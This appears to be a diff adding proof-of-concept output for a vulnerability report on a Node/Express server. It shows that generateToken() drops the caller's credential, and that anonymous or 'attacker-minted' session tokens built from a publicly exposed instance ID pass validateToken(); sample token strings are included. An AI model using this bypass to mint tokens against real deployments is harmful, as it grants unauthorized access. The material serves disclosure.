@@ -1,0 +1,23 @@
+=== Claim 1: generateToken() signature vs. what express.js actually passes ===
+Real call site in server/express.js:
+  const sToken = sessionToken.generateToken(cdapConfig, log, authToken);
+Real function signature in server/token.mjs:
+  export function generateToken(cdapConfig, logger = console) { ... }
+-> the 3rd argument (authToken, i.e. the caller's own credential) has no parameter to bind to.
+
+=== Claim 2: minting a token with NO real credential/session context ===
+Token minted by "anonymous caller A": 3PKv6fsbe18Xo5iVmPXJ0g==-jfvmYangZbfvS+9JUtGWxB17PWWPEuE9AQWpmFTNotOSFbz89rljmvgMiyTW6HGRwN252LWT3nXS3McLibZCo5yg/uQLUx5NhmjeZXacVLHSo4auoTXYtb801f7eq0JGMIfuDhuguuA=
+Token minted by "anonymous caller B": WGaWSlrO5+TcLf2izqxu/A==-o0Pw/bhbb/g/vbB6GtShlRoa23c9RDKWbmkq67wljgE4vklCNskyfeuorbxJiEuOoE8bqyOE1iyO/FRIUv1rfMNmW47X+SopYpz6dEsz7TAYvUBLAY2oqonwD9lFCdwvegwHsrQwU38=
+
+=== Claim 3: the REAL validateToken() accepts both, with zero identity check ===
+validateToken(anonymousToken1) => true
+validateToken(anonymousToken2) => true
+
+=== Control: garbage token is correctly rejected (proves validateToken is doing real work) ===
+validateToken("garbage") => false
+validateToken(undefined) => false
+
+=== Claim 4: a token minted for one "instance" config is valid for ANY caller who knows instance.metadata.id ===
+(instance.metadata.id is returned in the unauthenticated GET /config.js response - see report)
+Attacker-minted token: FDc7MtqYIP/J3vVLBYJBeQ==-ifajmdA2pkQpcXV2n5C9ugs4wNaOOw7hSoCmS36PPmYqzvka41Yxs3nfDDPFiTCAPoVvJ1WEtftXCJ9MUDt1hzSP1+suHAhA4wc+mYa57tIHFxWXjai3b23xcKJ4+OO476zAYqhq7L0=
+Does the REAL server-side validateToken() accept it? => true
